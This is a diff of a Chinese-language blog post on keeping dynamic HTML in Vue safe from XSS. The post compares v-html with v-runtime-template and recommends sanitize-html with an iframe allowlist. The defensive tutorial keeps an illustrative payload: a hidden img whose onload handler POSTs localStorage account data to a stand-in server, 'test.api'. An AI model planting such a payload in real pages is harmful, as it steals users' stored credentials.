@@ -13,16 +13,14 @@
 <meta property="og:site_name" content="Joseph&#39;s Work Note">
 <meta property="og:description" content="在開發系統中 有可能會需要使用到 CMS 系統或是動態抓取 CDN 的頁面 取得 使用者動態設定的樣板或是 Banner 這裡一般人可能不會特別想到就是 XSS Attack 我曾經遇過公司 有駭客入侵將靜態的 html 檔案裏面故意塞惡意程式碼，導致使用者看到錯誤畫面的狀況(被導走到其他頁面) (ex: 這些 html 可能被駭客塞一些 js or redirect 導到錯誤網站 讓使用者看到一">
 <meta property="og:locale" content="zh_TW">
-<meta property="og:image" content="https://josephmtsai.github.io/2022/06/26/VueHTMLTemplate/01.png">
 <meta property="article:published_time" content="2022-06-26T15:39:36.000Z">
-<meta property="article:modified_time" content="2022-06-27T16:15:27.960Z">
+<meta property="article:modified_time" content="2022-06-28T16:17:07.713Z">
 <meta property="article:author" content="Joseph M Tsai">
 <meta property="article:tag" content="Vue">
 <meta property="article:tag" content="v-html">
 <meta property="article:tag" content="v-sanitize">
 <meta property="article:tag" content="v-runtime-template">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://josephmtsai.github.io/2022/06/26/VueHTMLTemplate/01.png">
   
   
     <link rel="shortcut icon" href="/favicon.png">
@@ -103,17 +101,17 @@
 <p>舉例來說我們可以透過隱藏的圖片發送 request 給 駭客的 Server 並且偷取到對應的 Cookie or Session ….</p>
 <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span></span></span><br><span class="line"><span class="tag">  <span class="attr">src</span>=<span class="string">&quot;xxxx&quot;</span></span></span><br><span class="line"><span class="tag">  <span class="attr">style</span>=<span class="string">&quot;display:none&quot;</span></span></span><br><span class="line"><span class="tag">  <span class="attr">onload</span>=<span class="string">&quot;fetch(&#x27;https://test.api/&#x27;, &#123;method: &#x27;POST&#x27;, body: localStorage.getItem(&#x27;account&#x27;)&#125;)&quot;</span></span></span><br><span class="line"><span class="tag">/&gt;</span></span><br></pre></td></tr></table></figure>
 
-<p>回到主題來說<br>這裡列出兩種 vue 的 componet 可以動態 compile html ，這裡列出來用途以及差異<br>| Plugnin | Support | different | |<br>|——————–|——–|— ——–|—|<br>| v-html | 只支援純粹 HTML 無法支援 vue custom component | 無法防止 XSS attack |<br>| v-runtime-template | 支援 vue custom component &amp; variabe (需事先定義好) | 無法防止 XSS attack |</p>
-<p>我們可以看到我們在圖片 loading 的過程中插入 alert 如果沒有做任何阻擋 兩種方法都會跳 Alert</p>
+<p>這裡列出兩種 vue 的 componet 可以動態 compile html ，這裡列出來用途以及差異<br>| Plugnin | Support | different | |<br>|——————–|——–|— ——–|—|<br>| v-html | 只支援純粹 HTML 無法支援 vue custom component | 無法防止 XSS attack |<br>| v-runtime-template | 支援 vue custom component &amp; variabe (需事先定義好) | 無法防止 XSS attack |</p>
+<p>可能大家沒有感覺 那我們先來看以下範例<br>如果沒有透過過濾不合法的 tag 在上面的 Demo 內 會出現什麼呢?</p>
+<ol>
+<li>xss 的 alert</li>
+<li>非法的 iframe (假設我們沒有規定 iframe 是可以出現的)</li>
+</ol>
 <p><a target="_blank" rel="noopener" href="https://codesandbox.io/s/dynamic-template-yvfx0n">DEMO</a></p>
-<img src="/2022/06/26/VueHTMLTemplate/01.png" class="" title="Sample">
-
-<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span></span></span><br><span class="line"><span class="tag">  <span class="attr">src</span>=<span class="string">&quot;https://jnx.me/img/profile.jpg&quot;</span></span></span><br><span class="line"><span class="tag">  <span class="attr">style</span>=<span class="string">&quot;display:none&quot;</span></span></span><br><span class="line"><span class="tag">  <span class="attr">onload</span>=<span class="string">&quot;alert(&#x27;xss&#x27;);&quot;</span></span></span><br><span class="line"><span class="tag">/&gt;</span></span><br></pre></td></tr></table></figure>
-
 <p>接下來我們介紹今天的主角 Sanitize html</p>
 <p><a target="_blank" rel="noopener" href="https://github.com/apostrophecms/sanitize-html">sanitize html</a><br>在 Vue 3 裡面可以用<a target="_blank" rel="noopener" href="https://github.com/vannsl/vue-3-sanitize">vue-3-sanitize</a></p>
 <p>套件</p>
-<p>我們這裡可以透過此套件做比較主要的三件事情</p>
+<p>我們這裡可以透過此套件將 HTML 不合法的 TAG 或是相對應的 TAG 做一些限制以及過濾<br>這裡列出兩大項</p>
 <ol>
 <li>限制動態 HTML 的 TAG</li>
 </ol>
@@ -131,13 +129,17 @@
 <p>可以對照<a target="_blank" rel="noopener" href="https://codesandbox.io/s/dynamic-template-yvfx0n">DEMO</a><br>透過 sanitize 過濾掉有問題的語法 避免 XSS 攻擊</p>
 <figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">this</span>.$sanitize(<span class="variable language_">this</span>.<span class="property">message</span>);</span><br></pre></td></tr></table></figure>
 
-<p>因為靜態檔案最容易被人動手腳 尤其是系統一大 檔案一多不會有人時時刻刻去檢查….</p>
+<h3 id="範例"><a href="#範例" class="headerlink" title="範例"></a>範例</h3><p>那如果像剛剛這樣 假設我們想要允許特定 Domain 的 iframe 要怎麼辦呢</p>
+<p>我們可以透過 OverideOption 將特定的 domain &amp; tag 掛上去 這樣就可以避免 User 掛載一些奇怪的 Domain</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> overridenOptions = &#123;</span><br><span class="line">  <span class="attr">allowedTags</span>: [<span class="string">&#x27;iframe&#x27;</span>],</span><br><span class="line">  <span class="attr">allowedAttributes</span>: &#123;</span><br><span class="line">    <span class="attr">iframe</span>: [<span class="string">&#x27;src&#x27;</span>],</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">allowedIframeHostnames</span>: [<span class="string">&#x27;www.youtube.com&#x27;</span>],</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+
+<p>因為靜態檔案最容易被人動手腳 尤其是系統一大 檔案一多不會有人時時刻刻去檢查…就需要有這種檢查幫助我們去過濾語法</p>
 <h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><p><a target="_blank" rel="noopener" href="https://ithelp.ithome.com.tw/articles/10238479">XSS(Cross site scripting) 簡單範例</a><br><a target="_blank" rel="noopener" href="https://www.softwaretestinghelp.com/cross-site-scripting-xss-attack-test/">XSS Sample</a><br><a target="_blank" rel="noopener" href="https://github.com/vannsl/vue-3-sanitize">Vue 3 Sanitize</a></p>
 
       
     </div>
     <footer class="article-footer">
-      <a data-url="https://josephmtsai.github.io/2022/06/26/VueHTMLTemplate/" data-id="cl4wxyl2t0005b9n96p9qeney" data-title="Vue Dynamic HTML Prevent XSS" class="article-share-link">Share</a>
+      <a data-url="https://josephmtsai.github.io/2022/06/26/VueHTMLTemplate/" data-id="cl4ydgk4d0005aaoqb4rd7phe" data-title="Vue Dynamic HTML Prevent XSS" class="article-share-link">Share</a>
       
       
       
